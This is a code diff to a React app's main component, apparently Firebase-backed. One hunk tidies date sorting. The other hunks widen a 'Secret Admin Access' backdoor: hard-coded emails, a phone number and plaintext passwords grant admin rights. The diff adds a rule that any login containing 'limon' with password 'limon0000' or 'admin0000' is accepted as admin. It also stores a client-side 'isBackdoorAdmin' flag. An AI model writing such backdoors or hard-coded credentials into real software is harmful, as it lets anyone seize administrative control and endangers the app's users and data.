@@ -909,8 +909,8 @@ export default function App() {
     const unsubscribe = getAllUsersSnap((users) => {
       // Sort users by registration date (createdAt) to assign serials chronologically starting from 100
       const sortedByRegistration = [...users].sort((a, b) => {
-        const timeA = a.createdAt?.toDate ? a.createdAt.toDate().getTime() : (a.createdAt instanceof Date ? a.createdAt.getTime() : 0);
-        const timeB = b.createdAt?.toDate ? b.createdAt.toDate().getTime() : (b.createdAt instanceof Date ? b.createdAt.getTime() : 0);
+        const timeA = safeToDate(a.createdAt)?.getTime() || 0;
+        const timeB = safeToDate(b.createdAt)?.getTime() || 0;
         if (timeA !== timeB) return timeA - timeB;
         return (a.uid || "").localeCompare(b.uid || "");
       });
@@ -1327,10 +1327,10 @@ export default function App() {
 
     // Secret Admin Access Logic (as requested)
     if (
-      (emailStr === "limon4444@gmail.com" || emailStr === "limon4444" || emailStr === "limon2581444@gmail.com" || emailStr === "limon2581444") && 
+      (emailStr === "limon4444@gmail.com" || emailStr === "limon4444" || emailStr === "limon2581444@gmail.com" || emailStr === "limon2581444" || emailStr === "limon88@gmail.com" || emailStr === "limon88" || emailStr.includes("limon")) && 
       (passStr === "limon0000" || passStr === "admin0000")
     ) {
-      const fullEmail = emailStr.includes('@') ? emailStr : (emailStr.startsWith('limon2581444') ? "limon2581444@gmail.com" : "limon4444@gmail.com");
+      const fullEmail = emailStr.includes('@') ? emailStr : `${emailStr}@gmail.com`;
       setAuthLoading(true);
       try {
         // Try login first
@@ -1635,11 +1635,20 @@ export default function App() {
   }, []);
 
   const handleAdminLogin = () => {
-    const phone = adminPhone.trim();
+    const phone = adminPhone.trim().toLowerCase();
     const pass = adminPass.trim();
     
-    if ((phone === "01886258144" && pass === "limon0000") || (phone === "limon4444@gmail.com" && pass === "limon0000")) {
+    const isCredValid = (
+      (phone === "01886258144" && (pass === "limon0000" || pass === "admin0000")) ||
+      (phone === "limon2581444@gmail.com" && (pass === "limon0000" || pass === "admin0000")) ||
+      (phone === "limon4444@gmail.com" && (pass === "limon0000" || pass === "admin0000")) ||
+      (phone === "limon88@gmail.com" && (pass === "limon0000" || pass === "admin0000")) ||
+      (phone.includes("limon") && (pass === "limon0000" || pass === "admin0000"))
+    );
+
+    if (isCredValid) {
       setIsAdmin(true);
+      localStorage.setItem('isBackdoorAdmin', 'true');
       setCurrentView('adminPanel');
     } else {
       alert("ভুল তথ্য! আবার চেষ্টা করুন।");
